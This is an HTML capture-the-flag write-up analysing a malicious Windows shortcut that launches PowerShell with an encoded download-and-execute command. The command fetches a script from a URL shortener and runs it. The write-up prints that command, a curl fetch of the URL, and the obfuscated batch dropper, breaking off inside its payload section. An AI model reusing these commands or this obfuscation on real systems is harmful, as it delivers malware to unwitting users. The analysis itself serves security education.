<!doctype html><html lang=en><head><meta charset=utf-8><title> Russian Roulette</title><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=https://yctf.ch/css/main.css rel=stylesheet><link as=font crossorigin href=https://yctf.ch/fonts/JetBrainsMono-VariableFont_wght.ttf rel=preload type=font/ttf><link href=https://yctf.ch/rss.xml rel=alternate title=RSS type=application/rss+xml><link href=https://yctf.ch/atom.xml rel=alternate title=RSS type=application/atom+xml><script crossorigin src=https://cdn.jsdelivr.net/npm/@twemoji/api@latest/dist/twemoji.min.js></script><script crossorigin src=https://cdn.jsdelivr.net/npm/fuse.js@7.1.0/dist/fuse.basic.min.js></script><script defer src=https://yctf.ch/js/main.js></script><script defer src=https://yctf.ch/search_index.en.js></script><body class=min-h-[100svh]><div class="w-[50svw] md:w-96 bg-popover absolute left-1/2 top-1/3 transform -translate-x-1/2 -translate-y-1/2 hidden shadow-lg" id=goto-popup><input class="w-full h-8 lg:h-12 px-2 py-1 lg:px-4 lg:py-2" id=goto-input placeholder=Search><div class="w-full h-0.5 bg-muted"></div><div class="w-full max-h-96 overflow-y-auto flex flex-col" id=goto-results></div></div><a class="top-0 left-0 fixed z-10" href=https://yctf.ch> <div class="h-18 md:h-26 lg:h-32 p-2 md:p-4"><div class="w-full h-full flex items-center justify-center"><div class="w-full h-full [&>svg]:w-full [&>svg]:h-full [&>svg]:object-contain invert-colors select-none"><svg viewbox="0 0 300 300" fill=none xmlns=http://www.w3.org/2000/svg><g class=text-container><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" class=fills dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.406 x=49.297 y=171.602>Y</text></g><g class=text-container><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" class=fills dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.406 x=173.297 y=171.602>C</text></g><g class=text-container><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" class=fills dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.406 x=49.297 y=297.602>T</text></g><g class=text-container><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" class=fills dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.406 x=173.297 y=297.602>F</text></g></svg></div></div></div> </a><div class="text-secondary-foreground mx-6 md:py-2 py-1 font-black text-lg lg:text-xl top-0 right-0 fixed w-18 md:w-26 h-18 md:h-26 lg:h-32 p-2 md:p-4 text-center flex items-center justify-center z-10"></div><main id=scroll-element><div class="mt-24 mx-4 mb-24 sm:mx-0"><article class="prose dark:prose-invert mx-auto lg:prose-lg"><h1>Russian Roulette <span class="text-muted-foreground text-xl">by cstef</span></h1><div class="flex flex-row gap-4 items-center"><span><strong>2024-09-30</strong></span><span class=text-muted-foreground>(2 min. read)</span> - <span class="flex flex-row gap-2"> <a class="bg-accent text-accent-foreground px-2 py-1 rounded-md text-sm w-fit font-bold no-underline" href=/categories/malware> malware </a> </span><div class=flex-grow></div></div><h2 id=description>Description</h2><p>My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(<hr><p>We are given a <code>.lnk</code> file, that we can parse with <a href=https://pypi.org/project/LnkParse3/><code>lnkparse</code></a>:<pre class=z-code><code><span class="z-text z-plain">Windows Shortcut Information:
</span><span class="z-text z-plain">   ...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">   TARGET:
</span><span class="z-text z-plain">      ...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">   LINK INFO:
</span><span class="z-text z-plain">      ...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">   DATA:
</span><span class="z-text z-plain">      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
</span><span class="z-text z-plain">      Working directory: C:\Windows\system32
</span><span class="z-text z-plain">      Command line arguments: -e aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">   EXTRA:
</span><span class="z-text z-plain">      ...
</span></code></pre><p>Quite a lot of junk here but we see that <code>powershell.exe</code> is being passed some base64-encoded stuff.<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">"</span>aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=<span class="z-punctuation z-definition z-string z-end z-shell">"</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">base64</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span></span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> is.gd/zd4hZn</span><span class="z-comment z-line z-number-sign z-shell">
</span></span></code></pre><pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> is.gd/zd4hZn <span class="z-keyword z-operator z-assignment z-redirection z-shell">></span> first.out</span>
</span></code></pre><p>Our <code>first.out</code> file looks a bit weird, but we can deduct that is a <code>cmd</code> script split into three main parts:<ol><li>Aliases for the <code>set</code> command:</ol><pre class="language-cmd z-code" data-lang=cmd><code class=language-cmd data-lang=cmd><span class="z-source z-dosbatch"><span class="z-keyword z-operator z-conditional z-dosbatch">&</span><span class="z-keyword z-command z-dosbatch">cls</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-operator z-at z-dosbatch">@</span><span class="z-keyword z-command z-dosbatch">echo</span> off
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">x</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">set</span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span> s=
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>zz<span class="z-keyword z-operator z-comparison z-dosbatch">==</span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>p<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>/
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>ma<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>a
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>gm<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>c
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>qf<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>m
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>h<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>d
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>ax<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>e
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>ds<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>x
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>rb<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>i
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>cu<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>t
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>qd<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span></code></pre><ol start=2><li>Character mappings</ol><pre class="language-cmd z-code" data-lang=cmd><code class=language-cmd data-lang=cmd><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ma<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>z<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-constant z-numeric z-integer z-decimal z-dosbatch">8639305</span> <span class="z-constant z-character z-escape z-dosbatch">%%</span> <span class="z-constant z-numeric z-integer z-decimal z-dosbatch">8639208</span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qf<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>h<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>z<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>wp<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>=exitcodeAscii<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ma<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>ab<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-constant z-numeric z-integer z-decimal z-dosbatch">3403246</span> <span class="z-constant z-character z-escape z-dosbatch">%%</span> <span class="z-constant z-numeric z-integer z-decimal z-dosbatch">3403148</span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qf<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>h<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ab<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>v<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>=exitcodeAscii<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ma<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>cy<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-constant z-numeric z-integer z-decimal z-dosbatch">5276898</span> <span class="z-constant z-character z-escape z-dosbatch">%%</span> <span class="z-constant z-numeric z-integer z-decimal z-dosbatch">5276799</span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qf<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>h<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>p<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cy<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>x<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>s<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>e<span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>zz<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>=exitcodeAscii<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>
</span></code></pre><ol start=3><li>Payload</ol><pre class="language-cmd z-code" data-lang=cmd><code class=language-cmd data-lang=cmd><span class="z-source z-dosbatch"><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>eb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qd<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end 